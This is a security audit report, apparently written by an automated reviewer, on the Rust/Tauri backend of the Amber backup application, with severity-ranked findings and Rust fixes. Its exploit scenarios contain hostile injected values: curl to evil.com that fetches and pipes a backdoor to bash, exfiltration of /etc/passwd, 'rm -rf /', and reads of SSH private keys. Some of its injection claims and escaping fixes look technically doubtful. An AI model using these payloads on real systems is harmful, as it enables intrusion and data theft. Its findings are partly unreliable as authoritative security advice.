# Security Audit Report - Amber Backup Application
**Date:** 2025-12-04
**Auditor:** Security Review Agent
**Scope:** Tauri/Rust Backend (`src-tauri/src/`)

---

## Executive Summary

This security audit examined the Rust/Tauri backend of the Amber backup application, focusing on command injection, path traversal, secret management, file permissions, input validation, and privilege escalation risks.

**Overall Risk Level:** 🟡 **MEDIUM**

**Critical Findings:** 2
**High Findings:** 3
**Medium Findings:** 4
**Low Findings:** 2

The application has **good security practices** in several areas (keychain usage, error handling) but contains **critical command injection vulnerabilities** in rsync/rclone services that require immediate attention.

---

## 🔴 CRITICAL VULNERABILITIES

### CRIT-1: SSH Command Injection in rsync_service.rs

**File:** `src-tauri/src/services/rsync_service.rs`
**Lines:** 111-144
**Severity:** CRITICAL (CVSS 9.8)

#### Description
User-controlled SSH configuration parameters are directly interpolated into shell commands without proper sanitization. An attacker can inject arbitrary commands through SSH options.

#### Vulnerable Code
```rust
// Lines 116-134
if let Some(ref port) = ssh.port {
    if !port.trim().is_empty() {
        ssh_cmd.push_str(&format!(" -p {}", port));  // ❌ No sanitization
    }
}
if let Some(ref identity) = ssh.identity_file {
    if !identity.trim().is_empty() {
        ssh_cmd.push_str(&format!(" -i {}", identity));  // ❌ No sanitization
    }
}
if let Some(ref config) = ssh.config_file {
    if !config.trim().is_empty() {
        ssh_cmd.push_str(&format!(" -F {}", config));  // ❌ No sanitization
    }
}
if let Some(ref proxy) = ssh.proxy_jump {
    if !proxy.trim().is_empty() {
        ssh_cmd.push_str(&format!(" -J {}", proxy));  // ❌ No sanitization
    }
}
```

#### Exploit Scenario
```json
{
  "ssh_config": {
    "port": "22; rm -rf / #",
    "identity_file": "/key' && curl evil.com/backdoor.sh | bash #"
  }
}
```

When passed to rsync as `-e "ssh -p 22; rm -rf / #"`, the shell interprets this as multiple commands.

#### Impact
- **Remote Code Execution (RCE)** with user privileges
- **Data exfiltration** through command injection
- **System compromise** via malicious command execution

#### Fix Recommendation
```rust
use shell_escape;

// Validate and sanitize SSH parameters
fn validate_ssh_param(param: &str, param_name: &str) -> Result<String> {
    // Whitelist allowed characters
    let valid_chars = regex::Regex::new(r"^[a-zA-Z0-9._/\-:@]+$").unwrap();

    if !valid_chars.is_match(param) {
        return Err(AmberError::InvalidPath(format!(
            "Invalid characters in {}: {}", param_name, param
        )));
    }

    // Use shell_escape for additional safety
    Ok(shell_escape::escape(param.into()).to_string())
}

// Apply validation
if let Some(ref port) = ssh.port {
    if !port.trim().is_empty() {
        let safe_port = validate_ssh_param(port, "SSH port")?;
        // Verify it's actually a number
        port.parse::<u16>()
            .map_err(|_| AmberError::InvalidPath("Port must be a number"))?;
        ssh_cmd.push_str(&format!(" -p {}", safe_port));
    }
}
```

**Priority:** IMMEDIATE - Fix in next release

---

### CRIT-2: Custom Command Injection in rsync_service.rs

**File:** `src-tauri/src/services/rsync_service.rs`
**Lines:** 59-61, 168-181
**Severity:** CRITICAL (CVSS 9.1)

#### Description
The `custom_command` field allows users to provide arbitrary rsync commands that are parsed using `shell_words::split()` but not validated. Malicious users can inject any command.

#### Vulnerable Code
```rust
// Line 59-61
if let Some(ref custom) = conf.custom_command {
    if !custom.trim().is_empty() {
        return self.parse_custom_command(custom, &job.source_path, final_dest, link_dest);
    }
}

// Lines 175-180
fn parse_custom_command(&self, cmd: &str, source: &str, dest: &str, link_dest: Option<&str>) -> Vec<String> {
    let processed = cmd
        .replace("{source}", &self.ensure_trailing_slash(source))
        .replace("{dest}", dest)
        .replace("{linkDest}", link_dest.unwrap_or(""));

    shell_words::split(&processed).unwrap_or_else(|_| vec![processed])
}
```

#### Exploit Scenario
```json
{
  "config": {
    "custom_command": "rsync -a {source} {dest}; curl evil.com/exfil?data=$(cat /etc/passwd)"
  }
}
```

The `shell_words::split()` will properly split the command, but the semicolon creates a second command that will execute.

#### Impact
- **Arbitrary command execution** as the application user
- **Data theft** via command injection
- **Privilege escalation** if app runs with elevated permissions

#### Fix Recommendation
```rust
fn parse_custom_command(&self, cmd: &str, source: &str, dest: &str, link_dest: Option<&str>) -> Result<Vec<String>> {
    // STRICT VALIDATION: Only allow rsync with specific flags
    if !cmd.starts_with("rsync ") {
        return Err(AmberError::Config(
            "Custom command must start with 'rsync'".into()
        ));
    }

    // Check for dangerous characters
    let dangerous_chars = [';', '|', '&', '`', '$', '(', ')', '<', '>'];
    if cmd.chars().any(|c| dangerous_chars.contains(&c)) {
        return Err(AmberError::Config(
            "Custom command contains forbidden characters".into()
        ));
    }

    // Whitelist allowed rsync flags
    let allowed_flags = ["-a", "-v", "-z", "--delete", "--exclude", "--progress"];
    let parts = shell_words::split(&cmd)
        .map_err(|e| AmberError::Config(format!("Invalid command format: {}", e)))?;

    for part in &parts[1..] { // Skip 'rsync'
        if part.starts_with('-') && !allowed_flags.iter().any(|f| part.starts_with(f)) {
            return Err(AmberError::Config(
                format!("Disallowed rsync flag: {}", part)
            ));
        }
    }

    // Safe substitution
    let processed = cmd
        .replace("{source}", &shell_escape::escape(source.into()))
        .replace("{dest}", &shell_escape::escape(dest.into()))
        .replace("{linkDest}", &shell_escape::escape(link_dest.unwrap_or("").into()));

    Ok(shell_words::split(&processed).unwrap())
}
```

**Priority:** IMMEDIATE - Remove or heavily restrict custom commands

---

## 🟠 HIGH VULNERABILITIES

### HIGH-1: Path Traversal in File Operations

**File:** `src-tauri/src/commands/filesystem.rs`
**Lines:** 31-34, 48-50, 53-55
**Severity:** HIGH (CVSS 7.4)

#### Description
File operation commands (`read_dir`, `read_file_preview`, `open_path`) accept user-provided paths without validation, allowing directory traversal attacks.

#### Vulnerable Code
```rust
#[tauri::command]
pub async fn read_dir(state: State<'_, AppState>, path: String) -> Result<Vec<DirEntry>> {
    let entries = state.file_service.scan_directory(&path)?;  // ❌ No validation
    Ok(entries.into_iter().map(DirEntry::from).collect())
}

#[tauri::command]
pub async fn read_file_preview(
    state: State<'_, AppState>,
    file_path: String,  // ❌ No validation
    max_lines: Option<usize>,
) -> Result<String> {
    state.file_service.read_file_preview(&file_path, max_lines.unwrap_or(100))
}

#[tauri::command]
pub async fn open_path(state: State<'_, AppState>, path: String) -> Result<()> {
    state.file_service.open_path(&path)  // ❌ Opens arbitrary paths
}
```

#### Exploit Scenario
A malicious frontend or compromised IPC channel could request:
```javascript
await invoke('read_file_preview', {
  filePath: '../../../../etc/passwd'
});

await invoke('read_file_preview', {
  filePath: '/Users/victim/.ssh/id_rsa'
});
```

#### Impact
- **Information disclosure** - read any file readable by the app
- **Privacy breach** - access sensitive user data
- **Credential theft** - read SSH keys, tokens, passwords

#### Fix Recommendation
```rust
use std::path::{Path, PathBuf};

/// Validate path is within allowed directories
fn validate_path(path: &str, allowed_roots: &[&str]) -> Result<PathBuf> {
    let path = Path::new(path);

    // Canonicalize to resolve .. and symlinks
    let canonical = path.canonicalize()
        .map_err(|e| AmberError::InvalidPath(format!("Invalid path: {}", e)))?;

    // Check if path is within allowed roots
    let is_allowed = allowed_roots.iter().any(|root| {
        if let Ok(root_canonical) = Path::new(root).canonicalize() {
            canonical.starts_with(root_canonical)
        } else {
            false
        }
    });

    if !is_allowed {
        return Err(AmberError::PermissionDenied(
            format!("Path not in allowed directories: {}", path.display())
        ));
    }

    Ok(canonical)
}

#[tauri::command]
pub async fn read_dir(state: State<'_, AppState>, path: String) -> Result<Vec<DirEntry>> {
    // Define allowed roots (user's home, /Volumes, job destinations)
    let allowed_roots = vec![
        dirs::home_dir().unwrap().to_str().unwrap(),
        "/Volumes"
    ];

    let validated_path = validate_path(&path, &allowed_roots)?;
    let entries = state.file_service.scan_directory(
        validated_path.to_str().unwrap()
    )?;
    Ok(entries.into_iter().map(DirEntry::from).collect())
}
```

**Priority:** HIGH - Implement path validation in next sprint

---

### HIGH-2: Unsafe Process Termination with SIGKILL

**File:** `src-tauri/src/services/rsync_service.rs`
**Lines:** 336-370
**Severity:** HIGH (CVSS 6.8)

#### Description
The `kill_job` function uses `kill -9` (SIGKILL) which immediately terminates processes without cleanup, potentially causing:
- Data corruption in partially written backups
- Orphaned temporary files
- Inconsistent manifest state
- SQLite database corruption

#### Vulnerable Code
```rust
pub fn kill_job(&self, job_id: &str) -> Result<()> {
    if let Ok(mut jobs) = self.active_jobs.lock() {
        if let Some(pid) = jobs.remove(job_id) {
            #[cfg(unix)]
            {
                // First try to kill the process group
                let _ = Command::new("kill")
                    .args(["-9", &format!("-{}", pid)])  // ❌ SIGKILL = no cleanup
                    .status();

                let _ = Command::new("kill")
                    .args(["-9", &pid.to_string()])  // ❌ SIGKILL
                    .status();

                let _ = Command::new("pkill")
                    .args(["-9", "-P", &pid.to_string()])  // ❌ SIGKILL
                    .status();
            }
        }
    }
    Ok(())
}
```

#### Impact
- **Data corruption** in active backups
- **File system inconsistency**
- **Orphaned processes** if parent killed before children
- **Resource leaks** from unclosed file handles

#### Fix Recommendation
```rust
pub fn kill_job(&self, job_id: &str) -> Result<()> {
    if let Ok(mut jobs) = self.active_jobs.lock() {
        if let Some(pid) = jobs.remove(job_id) {
            #[cfg(unix)]
            {
                log::info!("Gracefully terminating rsync job {} (PID: {})", job_id, pid);

                // Step 1: Send SIGTERM for graceful shutdown
                let _ = Command::new("kill")
                    .args(["-TERM", &format!("-{}", pid)])
                    .status();

                // Step 2: Wait up to 5 seconds for graceful exit
                let start = std::time::Instant::now();
                while start.elapsed() < std::time::Duration::from_secs(5) {
                    // Check if process still exists
                    if Command::new("kill")
                        .args(["-0", &pid.to_string()])
                        .status()
                        .map(|s| !s.success())
                        .unwrap_or(true)
                    {
                        log::info!("Process {} terminated gracefully", pid);
                        return Ok(());
                    }
                    std::thread::sleep(std::time::Duration::from_millis(100));
                }

                // Step 3: Force kill only if process still running
                log::warn!("Process {} did not exit gracefully, forcing kill", pid);
                let _ = Command::new("kill")
                    .args(["-9", &format!("-{}", pid)])
                    .status();

                let _ = Command::new("kill")
                    .args(["-9", &pid.to_string()])
                    .status();
            }

            #[cfg(windows)]
            {
                // Windows: Try graceful first, then force
                log::info!("Terminating process {} on Windows", pid);
                let _ = Command::new("taskkill")
                    .args(["/PID", &pid.to_string()])
                    .status();

                std::thread::sleep(std::time::Duration::from_secs(2));

                let _ = Command::new("taskkill")
                    .args(["/PID", &pid.to_string(), "/T", "/F"])
                    .status();
            }
        }
    }
    Ok(())
}
```

**Priority:** HIGH - Implement graceful shutdown

---

### HIGH-3: Unvalidated Command Execution in filesystem.rs

**File:** `src-tauri/src/commands/filesystem.rs`
**Lines:** 63-71, 82-125
**Severity:** HIGH (CVSS 7.2)

#### Description
The `get_disk_stats` and `get_volume_info` commands execute `df` with user-provided paths without validation, allowing command injection via specially crafted paths.

#### Vulnerable Code
```rust
#[tauri::command]
pub async fn get_disk_stats(path: String) -> Result<String> {
    use std::process::Command;

    let output = Command::new("df")
        .args(["-h", &path])  // ❌ No sanitization of path
        .output()?;

    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

#[tauri::command]
pub async fn get_volume_info(path: String) -> Result<VolumeStats> {
    let output = Command::new("df")
        .args(["-k", &path])  // ❌ No sanitization
        .output()?;
    // ...
}
```

#### Exploit Scenario
While `Command::new("df").args([...])` properly passes arguments (not executed in shell), a path like `"; rm -rf / #"` won't execute commands. However, symlink exploitation is possible:

```bash
# Attacker creates symlink
ln -s /etc/passwd /tmp/malicious_path

# Frontend requests
invoke('get_volume_info', { path: '/tmp/malicious_path' })
```

This leaks information about system paths.

#### Impact
- **Information disclosure** via symlink traversal
- **Path manipulation** attacks
- **Denial of service** with invalid paths causing `df` errors

#### Fix Recommendation
```rust
#[tauri::command]
pub async fn get_volume_info(path: String) -> Result<VolumeStats> {
    use std::process::Command;

    // Validate path exists and is a directory
    let path_obj = Path::new(&path);
    if !path_obj.exists() {
        return Err(AmberError::InvalidPath("Path does not exist".into()));
    }
    if !path_obj.is_dir() {
        return Err(AmberError::InvalidPath("Path is not a directory".into()));
    }

    // Canonicalize to resolve symlinks and get real path
    let canonical_path = path_obj.canonicalize()
        .map_err(|e| AmberError::InvalidPath(format!("Cannot resolve path: {}", e)))?;

    // Verify path is within expected locations
    let path_str = canonical_path.to_str()
        .ok_or_else(|| AmberError::InvalidPath("Invalid path encoding".into()))?;

    // Only allow /Volumes, user home, or specified backup destinations
    if !path_str.starts_with("/Volumes/") &&
       !path_str.starts_with(&dirs::home_dir().unwrap().to_string_lossy().to_string()) {
        return Err(AmberError::PermissionDenied("Path not in allowed locations".into()));
    }

    // Use df -k with validated path
    let output = Command::new("df")
        .args(["-k", path_str])
        .output()?;

    // ... rest of parsing
}
```

**Priority:** HIGH - Add path validation

---

## 🟡 MEDIUM VULNERABILITIES

### MED-1: Insufficient Input Validation on Job Configuration

**File:** `src-tauri/src/types/job.rs` (referenced in commands)
**Lines:** Multiple
**Severity:** MEDIUM (CVSS 5.3)

#### Description
Job configuration fields (source_path, dest_path, exclude_patterns) lack comprehensive validation, potentially causing unexpected behavior or limited exploits.

#### Issues
```rust
// No validation on:
- source_path: Could be empty, malformed, or point to sensitive locations
- dest_path: Could overwrite system directories if user has permissions
- exclude_patterns: Could contain regex injection or path traversal
- bandwidth limits: No validation on format
```

#### Fix Recommendation
```rust
impl SyncJob {
    pub fn validate(&self) -> Result<()> {
        // Validate source path
        if self.source_path.trim().is_empty() {
            return Err(AmberError::Config("Source path cannot be empty".into()));
        }

        // Validate destination path
        if self.dest_path.trim().is_empty() {
            return Err(AmberError::Config("Destination path cannot be empty".into()));
        }

        // Prevent backup to system directories
        let dangerous_paths = ["/", "/bin", "/usr", "/System", "/etc"];
        if dangerous_paths.iter().any(|p| self.dest_path.starts_with(p)) {
            return Err(AmberError::PermissionDenied(
                "Cannot backup to system directory".into()
            ));
        }

        // Validate exclude patterns
        for pattern in &self.config.exclude_patterns {
            if pattern.contains("..") {
                return Err(AmberError::Config(
                    "Exclude patterns cannot contain '..'".into()
                ));
            }
        }

        Ok(())
    }
}
```

**Priority:** MEDIUM - Add in validation sprint

---

### MED-2: Symlink Following in Directory Scanning

**File:** `src-tauri/src/services/file_service.rs`
**Lines:** 24-57, 60-93
**Severity:** MEDIUM (CVSS 5.1)

#### Description
`scan_directory` and `scan_recursive` follow symlinks without checks, potentially:
- Causing infinite loops with circular symlinks
- Exposing files outside intended directories
- Enabling DoS via deeply nested symlink chains

#### Vulnerable Code
```rust
pub fn scan_directory(&self, dir_path: &str) -> Result<Vec<FileEntry>> {
    let path = Path::new(dir_path);
    if !path.exists() {
        return Err(AmberError::Io(std::io::Error::new(
            std::io::ErrorKind::NotFound,
            format!("Directory not found: {}", dir_path),
        )));
    }

    let mut entries = Vec::new();

    for entry in WalkDir::new(path).min_depth(1).max_depth(1) {  // ❌ Follows symlinks by default
        if let Ok(e) = entry {
            // ... processes symlink targets
        }
    }
    Ok(entries)
}
```

#### Fix Recommendation
```rust
pub fn scan_directory(&self, dir_path: &str) -> Result<Vec<FileEntry>> {
    let path = Path::new(dir_path);
    if !path.exists() {
        return Err(AmberError::Io(std::io::Error::new(
            std::io::ErrorKind::NotFound,
            format!("Directory not found: {}", dir_path),
        )));
    }

    let mut entries = Vec::new();

    for entry in WalkDir::new(path)
        .follow_links(false)  // ✅ Don't follow symlinks
        .min_depth(1)
        .max_depth(1)
    {
        if let Ok(e) = entry {
            if let Ok(metadata) = e.metadata() {
                let modified = metadata
                    .modified()
                    .ok()
                    .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
                    .map(|d| d.as_secs())
                    .unwrap_or(0);

                entries.push(FileEntry {
                    path: e.path().to_string_lossy().to_string(),
                    name: e.file_name().to_string_lossy().to_string(),
                    is_dir: metadata.is_dir(),
                    size: metadata.len(),
                    modified,
                });
            }
        }
    }

    Ok(entries)
}
```

**Priority:** MEDIUM - Disable symlink following

---

### MED-3: Rclone Command Injection (Similar to rsync)

**File:** `src-tauri/src/services/rclone_service.rs`
**Lines:** 129-169
**Severity:** MEDIUM (CVSS 5.9)

#### Description
While `rclone` commands use `Command::new(...).arg()` which prevents shell injection, the `bandwidth` parameter and remote paths are not validated.

#### Vulnerable Code
```rust
fn build_sync_command(
    &self,
    source_path: &str,
    remote_name: &str,
    remote_path: Option<&str>,
    bandwidth: Option<&str>,  // ❌ No validation
    _encrypt: bool,
) -> Command {
    let mut cmd = Command::new("rclone");
    cmd.arg("sync");
    cmd.arg(source_path);  // ❌ No validation

    let dest = match remote_path {
        Some(path) if !path.is_empty() => format!("{}:{}", remote_name, path),  // ❌ No validation
        _ => format!("{}:", remote_name),
    };
    cmd.arg(&dest);

    if let Some(bw) = bandwidth {
        if !bw.is_empty() {
            cmd.arg("--bwlimit");
            cmd.arg(bw);  // ❌ Could be malicious
        }
    }
    cmd
}
```

#### Fix Recommendation
```rust
fn validate_rclone_params(
    source_path: &str,
    remote_name: &str,
    remote_path: Option<&str>,
    bandwidth: Option<&str>,
) -> Result<()> {
    // Validate remote name
    let remote_regex = regex::Regex::new(r"^[a-zA-Z0-9_-]+$").unwrap();
    if !remote_regex.is_match(remote_name) {
        return Err(AmberError::Config("Invalid remote name".into()));
    }

    // Validate remote path
    if let Some(path) = remote_path {
        if path.contains("..") || path.starts_with('/') {
            return Err(AmberError::InvalidPath("Invalid remote path".into()));
        }
    }

    // Validate bandwidth format (e.g., "1M", "500K")
    if let Some(bw) = bandwidth {
        let bw_regex = regex::Regex::new(r"^\d+[KMG]?$").unwrap();
        if !bw_regex.is_match(bw) {
            return Err(AmberError::Config("Invalid bandwidth format".into()));
        }
    }

    Ok(())
}
```

**Priority:** MEDIUM - Add validation

---

### MED-4: Race Condition in Job Tracking

**File:** `src-tauri/src/services/rsync_service.rs`
**Lines:** 316-318
**Severity:** MEDIUM (CVSS 4.2)

#### Description
There's a race condition between checking `is_job_running()` and inserting into `active_jobs`, potentially allowing duplicate job spawns.

#### Vulnerable Code
```rust
// Line 241-247: Check
if self.is_job_running(&job.id) {
    log::warn!("[rsync_service] Job '{}' is already running, ignoring duplicate request", job.name);
    return Err(crate::error::AmberError::JobAlreadyRunning(job.id.clone()));
}

// ... spawn happens ...

// Lines 316-318: Insert (separate lock acquisition)
if let Ok(mut jobs) = self.active_jobs.lock() {
    jobs.insert(job.id.clone(), child.id());
}
```

#### Impact
- Two concurrent calls could both pass the `is_job_running` check
- Results in duplicate rsync processes
- Resource waste and potential data conflicts

#### Fix Recommendation
```rust
pub fn spawn_rsync(&self, job: &SyncJob) -> Result<Child> {
    // Acquire lock once and check + insert atomically
    let mut jobs = self.active_jobs.lock()
        .map_err(|_| AmberError::Job("Failed to acquire lock".into()))?;

    // Check if already running
    if jobs.contains_key(&job.id) {
        return Err(AmberError::JobAlreadyRunning(job.id.clone()));
    }

    // Reserve slot immediately
    jobs.insert(job.id.clone(), 0);  // Temporary PID
    drop(jobs);  // Release lock before spawn

    // Spawn process
    let child = match Command::new("rsync")
        .args(&args)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
    {
        Ok(c) => c,
        Err(e) => {
            // Remove reservation on failure
            if let Ok(mut jobs) = self.active_jobs.lock() {
                jobs.remove(&job.id);
            }
            return Err(e.into());
        }
    };

    // Update with real PID
    if let Ok(mut jobs) = self.active_jobs.lock() {
        jobs.insert(job.id.clone(), child.id());
    }

    Ok(child)
}
```

**Priority:** MEDIUM - Fix race condition

---

## 🟢 LOW VULNERABILITIES

### LOW-1: Insufficient File Permission Checks

**File:** `src-tauri/src/services/file_service.rs`
**Severity:** LOW (CVSS 3.1)

#### Description
File operations don't check if the application has necessary permissions before attempting operations, potentially exposing permission errors to users.

#### Fix Recommendation
Add permission checks before file operations:
```rust
pub fn read_file_preview(&self, file_path: &str, max_lines: usize) -> Result<String> {
    use std::fs::File;
    use std::io::{BufRead, BufReader};

    let path = Path::new(file_path);

    // Check read permissions
    let metadata = path.metadata()
        .map_err(|e| AmberError::PermissionDenied(format!("Cannot access file: {}", e)))?;

    if metadata.permissions().readonly() && !cfg!(target_os = "windows") {
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mode = metadata.permissions().mode();
            if mode & 0o400 == 0 {  // Check owner read permission
                return Err(AmberError::PermissionDenied(
                    "No read permission for file".into()
                ));
            }
        }
    }

    // Proceed with reading
    // ...
}
```

**Priority:** LOW - Enhancement

---

### LOW-2: Logging of Sensitive Information

**File:** Multiple
**Severity:** LOW (CVSS 2.1)

#### Description
Various log statements may leak sensitive information in production logs.

#### Examples
```rust
// src-tauri/src/services/keychain_service.rs:25
log::info!("[Keychain] Stored password for job {}", job_id);  // ⚠️ Logs job ID

// src-tauri/src/services/rsync_service.rs:298
log::info!("[rsync_service] Spawning rsync with {} args: {:?}", args.len(), args);
// ⚠️ Could log file paths or SSH keys
```

#### Fix Recommendation
```rust
// Sanitize logs in production
#[cfg(debug_assertions)]
log::info!("[rsync_service] Spawning rsync with args: {:?}", args);

#[cfg(not(debug_assertions))]
log::info!("[rsync_service] Spawning rsync with {} args", args.len());
```

**Priority:** LOW - Log sanitization

---

## ✅ POSITIVE SECURITY FINDINGS

### 1. ✅ Secure Keychain Usage
**File:** `src-tauri/src/services/keychain_service.rs`

The application properly uses the OS keychain for credential storage:
- Passwords stored in macOS Keychain (not plaintext)
- Proper error handling for keychain operations
- Credentials never logged or exposed

### 2. ✅ Proper Error Handling
**File:** `src-tauri/src/error.rs`

Good error type design:
- Specific error variants (no catch-all `Other`)
- Implements `Serialize` for frontend communication
- Structured error messages

### 3. ✅ Safe Command Execution Pattern (mostly)
Using `Command::new(...).args([...])` prevents shell injection in most places (except SSH command string).

### 4. ✅ No Hardcoded Secrets
No API keys, passwords, or tokens found in source code.

---

## 📊 RISK MATRIX

| Severity | Count | Examples |
|----------|-------|----------|
| 🔴 Critical | 2 | SSH injection, Custom command injection |
| 🟠 High | 3 | Path traversal, Unsafe kill, df injection |
| 🟡 Medium | 4 | Input validation, Symlinks, Rclone, Race condition |
| 🟢 Low | 2 | Permissions, Logging |

---

## 🔧 REMEDIATION ROADMAP

### Phase 1: IMMEDIATE (Sprint 1)
1. **CRIT-1**: Sanitize SSH parameters in `rsync_service.rs`
2. **CRIT-2**: Remove or heavily restrict custom commands
3. **HIGH-1**: Implement path validation for all file operations

### Phase 2: HIGH PRIORITY (Sprint 2)
4. **HIGH-2**: Implement graceful process termination
5. **HIGH-3**: Add path validation to `df` commands
6. **MED-1**: Add comprehensive input validation to job configs

### Phase 3: MEDIUM PRIORITY (Sprint 3)
7. **MED-2**: Disable symlink following in directory scans
8. **MED-3**: Validate rclone parameters
9. **MED-4**: Fix race condition in job tracking

### Phase 4: ENHANCEMENTS (Sprint 4)
10. **LOW-1**: Add permission checks before file operations
11. **LOW-2**: Sanitize production logs

---

## 🛡️ SECURITY BEST PRACTICES RECOMMENDATIONS

### 1. Input Validation Framework
Create a centralized validation module:
```rust
mod security {
    pub fn validate_file_path(path: &str, allowed_roots: &[&str]) -> Result<PathBuf>;
    pub fn validate_ssh_param(param: &str, param_type: SshParamType) -> Result<String>;
    pub fn validate_job_config(job: &SyncJob) -> Result<()>;
}
```

### 2. Principle of Least Privilege
- Run rsync/rclone processes with minimal permissions
- Consider sandboxing external command execution
- Drop privileges after initialization if possible

### 3. Security Testing
Implement automated security tests:
```rust
#[cfg(test)]
mod security_tests {
    #[test]
    fn test_ssh_injection_blocked() {
        let result = build_rsync_args(&malicious_job);
        assert!(result.is_err());
    }

    #[test]
    fn test_path_traversal_blocked() {
        let result = read_dir("../../../../etc/passwd");
        assert!(result.is_err());
    }
}
```

### 4. Dependency Audits
Run regular security audits:
```bash
cargo audit
cargo outdated
cargo deny check advisories
```

### 5. Code Review Checklist
Before merging PRs, verify:
- [ ] All user input is validated
- [ ] No shell command injection possible
- [ ] Paths are canonicalized and validated
- [ ] Sensitive data not logged
- [ ] Error messages don't leak system info

---

## 📚 REFERENCES

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [Rust Security Guidelines](https://anssi-fr.github.io/rust-guide/)

---

## 📧 CONTACT

For questions about this audit or to report new security issues:
- Security Team: [Create GitHub Security Advisory]
- Priority: Critical issues should be reported immediately

---

**End of Security Audit Report**
